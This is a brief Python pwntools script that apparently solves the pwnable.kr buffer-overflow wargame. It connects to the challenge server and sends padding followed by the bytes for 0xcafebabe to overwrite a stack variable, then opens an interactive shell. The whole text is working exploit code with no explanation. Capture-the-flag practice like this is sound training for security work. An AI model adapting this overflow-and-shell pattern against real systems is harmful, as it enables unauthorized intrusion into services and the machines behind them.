from pwn import *

session = remote("pwnable.kr", 9000)

payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM" + "\xbe\xba\xfe\xca"

session.sendline(payload)

session.interactive()